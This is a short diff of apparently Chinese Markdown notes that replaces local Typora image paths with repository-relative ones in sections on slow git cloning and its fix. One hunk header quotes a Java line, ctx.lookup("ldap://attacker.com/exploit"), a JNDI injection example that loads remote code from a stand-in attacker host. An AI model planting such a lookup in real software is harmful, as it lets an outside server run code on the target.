@@ -506,7 +506,7 @@ Object obj = ctx.lookup("ldap://attacker.com/exploit");
 
 速度过慢：
 
-![image-20250303193742149](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20250303193742149.png)
+![问题-克隆仓库过慢，一直处于等待](picture/问题-克隆仓库过慢，一直处于等待.png)
 
 解决方案：
 
@@ -569,7 +569,7 @@ Linux 命令：`sudo /etc/init.d/nscd restart`，如报错则须安装：`sudo a
 
 **解决成功：**
 
-![image-20250303193705451](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20250303193705451.png)
+![问题-克隆仓库解决](picture/问题-克隆仓库解决.png)
 
 
 
